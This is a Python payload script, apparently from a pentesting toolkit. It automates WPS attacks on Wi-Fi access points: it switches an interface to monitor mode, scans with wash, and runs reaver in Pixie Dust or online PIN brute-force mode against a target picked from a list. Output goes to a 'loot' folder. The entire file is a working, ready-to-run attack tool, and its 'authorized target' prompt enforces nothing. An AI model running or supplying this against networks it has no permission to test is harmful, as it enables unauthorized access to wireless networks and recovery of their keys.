#!/usr/bin/env python3
# @active: true
# @name: WPS Pixie Dust + Brute-Force
# @desc: Attack WPS-enabled access points using Pixie Dust (offline) and online brute-force via reaver/wash.
# @category: wifi
# @danger: true
# @inputs: [{"name":"scan_seconds","label":"WPS scan duration","type":"number","default":"12"},{"name":"mode","label":"Audit mode","type":"select","choices":["pixie","pin"],"default":"pixie"},{"name":"timeout","label":"Audit timeout","type":"number","default":"300"}]

import os
import re
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))
from payloads._iface_helper import list_interfaces
from payloads._web_input import request_input


def choose_interface():
    found = [x for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not found:
        print("No monitor-capable Wi-Fi interface found", flush=True)
        return None
    choices = [{"value": x["name"], "label": f"{x['name']} · {x.get('bus') or 'unknown'}"} for x in found]
    return str(request_input("Select monitor-capable Wi-Fi interface", input_type="select", choices=choices))


def run_checked(cmd, timeout=15):
    result = subprocess.run(cmd, text=True, capture_output=True, timeout=timeout)
    if result.returncode:
        raise RuntimeError((result.stderr or result.stdout or "command failed").strip())
    return result.stdout


def set_mode(iface, mode):
    for cmd in (["sudo", "-n", "ip", "link", "set", iface, "down"],
                ["sudo", "-n", "iw", "dev", iface, "set", "type", mode],
                ["sudo", "-n", "ip", "link", "set", iface, "up"]):
        run_checked(cmd)


def scan(iface, seconds):
    proc = subprocess.Popen(["sudo", "-n", "wash", "-i", iface, "-s"], stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True, start_new_session=True)
    try:
        out, _ = proc.communicate(timeout=seconds)
    except subprocess.TimeoutExpired:
        os.killpg(proc.pid, signal.SIGTERM)
        out, _ = proc.communicate(timeout=5)
    rows = []
    for line in out.splitlines():
        match = re.match(r"^([0-9A-Fa-f:]{17})\s+(\d+)\s+(-?\d+)\s+(\S+)\s+(\S+)\s*(.*)$", line.strip())
        if match:
            rows.append({"bssid": match[1].upper(), "channel": match[2], "rssi": match[3],
                         "version": match[4], "locked": match[5], "ssid": match[6] or "<hidden>"})
    return rows


def main():
    for tool in ("wash", "reaver", "iw", "ip"):
        if not shutil.which(tool):
            print(f"Missing required tool: {tool}", flush=True)
            return 127
    try:
        scan_seconds = min(60.0, max(3.0, float(sys.argv[1]) if len(sys.argv) > 1 else 12.0))
        mode = sys.argv[2] if len(sys.argv) > 2 else "pixie"
        timeout = min(1800.0, max(10.0, float(sys.argv[3]) if len(sys.argv) > 3 else 300.0))
    except ValueError:
        print("Durations must be numeric", flush=True)
        return 2
    if mode not in ("pixie", "pin"):
        print("Mode must be pixie or pin", flush=True)
        return 2
    iface = choose_interface()
    if not iface:
        return 1
    loot = Path(os.environ["CITYPOP_LOOT"]) / "WPS"
    loot.mkdir(parents=True, exist_ok=True)
    proc = None
    try:
        set_mode(iface, "monitor")
        print(f"Scanning WPS networks on {iface} for {scan_seconds:g}s", flush=True)
        aps = scan(iface, scan_seconds)
        if not aps:
            print("No WPS access points found", flush=True)
            return 0
        choices = [{"value": str(i), "label": f"{x['ssid']} · {x['bssid']} · ch{x['channel']} · lock:{x['locked']}"}
                   for i, x in enumerate(aps)]
        selected = str(request_input("Select authorized WPS target", input_type="select", choices=choices))
        if not selected.isdigit() or int(selected) >= len(aps):
            print("Invalid target selection", flush=True)
            return 2
        ap = aps[int(selected)]
        cmd = ["sudo", "-n", "reaver", "-i", iface, "-b", ap["bssid"], "-c", ap["channel"], "-vv"]
        cmd += ["-K", "1"] if mode == "pixie" else ["-d", "2", "-r", "3:15"]
        log = loot / f"wps_{ap['bssid'].replace(':', '')}_{int(time.time())}.log"
        print(f"Starting {mode} audit against {ap['ssid']} for at most {timeout:g}s", flush=True)
        with log.open("w", encoding="utf-8") as output:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
                                    start_new_session=True)
            deadline = time.monotonic() + timeout
            while proc.poll() is None and time.monotonic() < deadline:
                line = proc.stdout.readline()
                if line:
                    output.write(line); output.flush(); print(line.rstrip(), flush=True)
            if proc.poll() is None:
                os.killpg(proc.pid, signal.SIGTERM)
        print(f"Audit log saved to {log}", flush=True)
        return 0
    except (RuntimeError, subprocess.SubprocessError, OSError) as exc:
        print(f"WPS audit failed: {exc}", flush=True)
        return 1
    finally:
        if proc and proc.poll() is None:
            os.killpg(proc.pid, signal.SIGTERM)
        try:
            set_mode(iface, "managed")
        except Exception as exc:
            print(f"Warning: failed to restore {iface}: {exc}", flush=True)


if __name__ == "__main__":
    raise SystemExit(main())
